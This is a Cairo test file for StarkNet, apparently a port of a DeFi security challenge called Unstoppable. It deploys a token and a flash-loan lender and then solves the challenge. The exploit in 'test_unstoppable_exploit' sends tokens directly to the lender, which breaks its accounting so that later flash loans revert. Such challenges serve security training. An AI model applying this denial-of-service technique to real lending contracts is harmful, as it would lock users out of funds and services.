%lang starknet

from protostar.asserts import (
    assert_eq, assert_not_eq, assert_signed_lt, assert_signed_le, assert_signed_gt,
    assert_unsigned_lt, assert_unsigned_le, assert_unsigned_gt, assert_signed_ge,
    assert_unsigned_ge)

from starkware.cairo.common.cairo_builtins import HashBuiltin

from starkware.starknet.common.syscalls import (
    get_contract_address, get_block_number, get_block_timestamp, get_caller_address
)

from starkware.cairo.common.uint256 import (
    Uint256, uint256_add, uint256_sub, uint256_le, uint256_lt, uint256_check, uint256_eq, assert_uint256_eq
)

@contract_interface
namespace IReceiverUnstoppable {
    func execute_flash_loan(amount: Uint256) {
    }
}

@contract_interface
namespace IDVT {
    func approve(spender: felt, amount: Uint256) {
    }
    
    func allowance(owner: felt, spender: felt) -> (remaining: Uint256) {
    }

    func balanceOf(account: felt) -> (balance: Uint256) {
    }

    func transfer(recipient: felt, amount: Uint256) -> (success: felt) {
    }
}

@contract_interface
namespace IUnstoppableLender {
    func deposit_tokens(amount: Uint256) {
    }

    func set_receiver_unstoppable_address(receiver_unstoppable: felt) {
    }

    func flash_loan(amount: Uint256) {
    }
    
}

@storage_var
func caller_address() -> (res: felt) {
}

@view
func __setup__{syscall_ptr: felt*, range_check_ptr}() {
    alloc_locals;
    local contract_address: felt;
    local tokens_in_pool: Uint256 = Uint256(1000000, 0);
    local initial_attacker_token_balance: Uint256 = Uint256(100, 0);
    local initial_supply: Uint256 = Uint256(1000000000000000000000000,0);
    local token_name: felt = 12345;
    local token_symbol: felt = 111;
    local unstoppable_lender: felt;
    local receiver_unstoppable: felt;
    local dvt: felt;
    
    // Caller address index:
    // 1 - Deployer
    // 2 - Attacker
    // 3 - Just some user
    %{ 
        deployer = start_prank(1)
     %}
    let (local deployer: felt) = get_caller_address();
    // Deploy IDVT
    %{ context.dvt = deploy_contract("./lib/cairo_contracts/src/openzeppelin/token/erc20/presets/ERC20.cairo", 
        [
            ids.token_name, 
            ids.token_symbol, 
            18, 
            1000000000000000000000000, 
            0,
            ids.deployer
        ]).contract_address %}
    %{ ids.dvt = context.dvt %}
    // Deploy unstoppable_lender
    %{ context.unstoppable_lender = deploy_contract("./src/unstoppable/unstoppable_lender.cairo", [context.dvt]).contract_address %}
    %{ ids.unstoppable_lender = context.unstoppable_lender %}
    %{ 
        deployer_dvt = start_prank(1, ids.dvt)
        deployer_unstoppable_lender = start_prank(1, ids.unstoppable_lender)
     %}
    // Give approval
    IDVT.approve(dvt, deployer, initial_supply);
    IDVT.approve(dvt, unstoppable_lender, tokens_in_pool);

    // Deposit tokens
    IUnstoppableLender.deposit_tokens(unstoppable_lender, tokens_in_pool);

    // Transfer tokens to attacker
    IDVT.transfer(dvt, 2, initial_attacker_token_balance);

    // Ensure balances are correct
    let (unstoppable_lender_balance) = IDVT.balanceOf(dvt, unstoppable_lender);
    let (attacker_balance) = IDVT.balanceOf(dvt, 2);
    assert_uint256_eq(unstoppable_lender_balance, tokens_in_pool);
    assert_uint256_eq(attacker_balance, initial_attacker_token_balance);

    %{
        deployer()
        deployer_dvt()
        deployer_unstoppable_lender()
    %}

    // Show it's possible for some user to take out flash loan

    %{ context.receiver_unstoppable = deploy_contract("./src/unstoppable/receiver_unstoppable.cairo", [context.unstoppable_lender]).contract_address %}
    %{ ids.receiver_unstoppable = context.receiver_unstoppable %}

    let (some_user) = get_caller_address();

    let borrow_amount: Uint256 = Uint256(10, 0);

    %{ some_user_unstoppable_lender = start_prank(3, ids.unstoppable_lender) %}
    IUnstoppableLender.set_receiver_unstoppable_address(unstoppable_lender, receiver_unstoppable);
    IReceiverUnstoppable.execute_flash_loan(receiver_unstoppable, borrow_amount);

    %{ some_user_unstoppable_lender %}

    return ();
}

@external
func test_unstoppable_exploit{syscall_ptr: felt*, pedersen_ptr: HashBuiltin*, range_check_ptr}() {
    alloc_locals;
    local unstoppable_lender: felt;
    local receiver_unstoppable: felt;
    local initial_attacker_token_balance: Uint256 = Uint256(100, 0);
    local borrow_amount: Uint256 = Uint256(10, 0);
    local dvt: felt;
    %{ 
        ids.dvt = context.dvt
        ids.unstoppable_lender = context.unstoppable_lender
        ids.receiver_unstoppable = context.receiver_unstoppable
        attacker = start_prank(2, ids.dvt)
    %}

    // CODE YOUR EXPLOIT HERE
    IDVT.transfer(dvt, unstoppable_lender, initial_attacker_token_balance);

    %{ attacker %}

    //It should be no longer possible to execute flash loans
    %{ expect_revert() %}
    IReceiverUnstoppable.execute_flash_loan(receiver_unstoppable, borrow_amount);
    return ();
}